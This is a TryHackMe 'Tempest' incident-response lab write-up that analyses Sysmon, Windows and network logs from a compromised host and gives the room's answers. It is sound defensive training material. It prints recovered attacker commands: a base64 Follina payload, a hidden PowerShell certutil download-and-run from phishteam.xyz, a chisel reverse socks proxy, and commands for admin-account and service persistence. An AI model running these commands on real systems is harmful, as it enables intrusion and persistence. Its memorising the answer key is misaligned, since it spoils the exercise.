# Tempest - TryHackMe

> Analyze endpoint and network logs from a compromised machine

**Room Link:** https://tryhackme.com/room/tempestincident

<img width="1473" height="927" alt="image" src="https://github.com/user-attachments/assets/a8999805-443b-4af7-82f0-efc0eeccac85" />

---

## Task 3: Preparation - Tools and Artifacts

### File Hashes

**PowerShell command:**
```powershell
Get-FileHash * -Algorithm SHA256
```

**Q1: SHA256 hash of capture.pcapng?**

- Answer: `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`

---

**Q2: SHA256 hash of sysmon.evtx?**

- Answer: `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`

---

**Q3: SHA256 hash of windows.evtx?**

- Answer: `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

---

## Task 4: Initial Access - Malicious Document

### Known Info

- Malicious .doc file
- Downloaded via chrome.exe
- Chain of commands executed

### Questions

**Q1: File name of malicious document?**

**Filter:** Event ID 11 (File Create), Image: chrome.exe

Look for .doc file creation.

- Answer: `free_magicules.doc`

---

**Q2: Compromised user and machine name?**

Check same log entry.

- Answer: `benimaru-tempest`

---

**Q3: PID of Microsoft Word process?**

**Filter:** Event ID 1, User: benimaru, Image: winword.exe

- Answer: `496`

---

**Q4: IPv4 address resolved by malicious domain?**

**Filter:** Event ID 22 (DNS Query), PID: 496

- Answer: `167.71.199.191`

---

**Q5: Base64 encoded string in malicious payload?**

**Filter:** Event ID 1, ParentProcessID: 496

Check CommandLine field.

- Answer: `JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==`

**Decode with CyberChef:** From Base64

---

**Q6: CVE number of exploit used?**

Research Follina vulnerability.

- Answer: `CVE-2022-30190`

---

## Task 5: Initial Access - Stage 2 Execution

**Q1: Full path of payload written to system?**

**Filter:** Event ID 11, TargetFilename contains "Startup"

- Answer: `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip`

---

**Q2: Command executed upon user login?**

**Filter:** Event ID 1, ParentProcess: explorer.exe, User: benimaru

Look for autostart execution.

- Answer: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`

---

**Q3: SHA256 hash of stage 2 binary?**

Check hash of first.exe in Event ID 1.

- Answer: `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D`

---

**Q4: C2 domain and port?**

**Filter:** ParentProcess: first.exe

Check network connections and DNS queries.

- Answer: `resolvecyber.xyz:80`

---

## Task 6: Malicious Document Traffic

### Wireshark Analysis

**Q1: URL of malicious payload in document?**

**Filter:**
```
http.host == "phishteam.xyz" && http.request.method == "GET"
```

- Answer: `http://phishteam.xyz/02dcf07/update.zip`

---

**Q2: Encoding used on C2 connection?**

Check HTTP traffic to resolvecyber.xyz.

Data after q= parameter.

- Answer: `Base64`

---

**Q3: Parameter containing executed command results?**

- Answer: `q`

---

**Q4: URL used by binary for C2 commands?**

- Answer: `/9ab62b5`

---

**Q5: HTTP method used?**

- Answer: `GET`

---

**Q6: Programming language used to compile binary?**

Check User-Agent in packet details.

- Answer: `Nim`

---

## Task 7: Discovery - Internal Reconnaissance

**Q1: Password discovered in sensitive file?**

Decode base64 commands in C2 traffic.

Look for file contents.

- Answer: `infernotempest`

---

**Q2: Listening port for remote shell?**

Decode netstat command output.

WinRM default port.

- Answer: `5985`

---

**Q3: Command for reverse socks proxy?**

Check ch.exe execution.

- Answer: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`

---

**Q4: SHA256 hash of socks proxy binary?**

Check ch.exe hash.

- Answer: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`

---

**Q5: Tool name based on hash?**

Check VirusTotal.

- Answer: `chisel`

---

**Q6: Service used to authenticate?**

Check process spawned after socks proxy.

wsmprovhost.exe indicates WinRM.

- Answer: `winrm`

---

## Task 8: Privilege Escalation

**Q1: Binary name and hash for privilege escalation?**

Check downloads after socks proxy.

Parent: wsmprovhost.exe

- Answer: `spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`

---

**Q2: Tool name based on hash?**

- Answer: `printspoofer`

---

**Q3: Privilege exploited by tool?**

- Answer: `SeImpersonatePrivilege`

---

**Q4: Binary used to establish C2 connection?**

Check execution through spf.exe.

- Answer: `final.exe`

---

**Q5: Port used by new C2 connection?**

**Wireshark filter:**
```
ip.dst == 167.71.222.162
```

- Answer: `8080`

---

## Task 9: Actions on Objective

**Q1: Two user accounts created?**

**Filter:** Event ID 1, ParentProcess: net.exe

- Answer: `shion, shona`

---

**Q2: Missing option that caused failed creation?**

Check failed net user commands.

- Answer: `/add`

---

**Q3: Event ID for account creation?**

Windows Security logs.

- Answer: `4720`

---

**Q4: Command to add account to administrators?**

- Answer: `net localgroup administrators /add shion`

---

**Q5: Event ID for addition to sensitive group?**

- Answer: `4732`

---

**Q6: Command for persistent administrative access?**

Look for service creation with sc.exe.

- Answer: `sc create TempestUpdate2 binPath=C:\Users\Public\Downloads\final.exe start=auto`

---

## Quick Reference

### Attack Timeline

```
1. Malicious doc (free_magicules.doc)
2. Follina exploit (CVE-2022-30190)
3. Download update.zip
4. Persistence (Startup folder)
5. Stage 2 (first.exe)
6. C2 connection (resolvecyber.xyz)
7. Download chisel (ch.exe)
8. Reverse socks proxy
9. WinRM authentication
10. PrintSpoofer (spf.exe)
11. Privilege escalation
12. Account creation (shion, shona)
13. Service persistence (TempestUpdate2)
```

### Key Event IDs

**Sysmon:**
- 1: Process creation
- 3: Network connection
- 11: File create
- 22: DNS query

**Windows Security:**
- 4720: User account created
- 4732: Member added to group

### Tools Used by Attacker

| Tool | Purpose |
|------|---------|
| certutil | Download payloads |
| chisel | Reverse socks proxy |
| PrintSpoofer | Privilege escalation |
| net.exe | User/group management |
| sc.exe | Service creation |

### Sysmon Filtering

**Process creation:**
```
Event ID: 1
Image: process.exe
ParentProcess: parent.exe
```

**File creation:**
```
Event ID: 11
TargetFilename: path
```

**Network:**
```
Event ID: 3
DestinationIp: IP
DestinationPort: PORT
```

**DNS:**
```
Event ID: 22
QueryName: domain
```

### Wireshark Filtering

**HTTP traffic:**
```
http.host == "domain.com"
http.request.method == "GET"
```

**IP destination:**
```
ip.dst == 1.2.3.4
```

### PowerShell Decoding

**Base64 decode:**
```powershell
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("string"))
```

Or use CyberChef: From Base64

### Persistence Mechanisms

**Startup folder:**
- Path: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
- Executes on login

**Service creation:**
```cmd
sc create ServiceName binPath=C:\path\to\binary.exe start=auto
```

### Privilege Escalation

**PrintSpoofer exploit:**
- Abuses SeImpersonatePrivilege
- Elevates to SYSTEM
- Common in service accounts

### C2 Communication Patterns

**Indicators:**
- Base64 encoded commands
- HTTP GET with parameters
- Custom User-Agent (Nim)
- Suspicious domains
- Non-standard ports

---

## Key Takeaways

- **Follina (CVE-2022-30190)** initial access
- **free_magicules.doc** malicious document
- **certutil** downloads stage 2
- **Startup folder** persistence
- **chisel** reverse socks proxy
- **WinRM port 5985** remote access
- **PrintSpoofer** escalates privileges
- **SeImpersonatePrivilege** exploited
- **Service creation** for persistence
- **Event ID 4720** user created
- **Event ID 4732** group addition
- **Base64** C2 encoding
- **Nim** programming language
- **Multi-stage** attack chain

Happy hunting
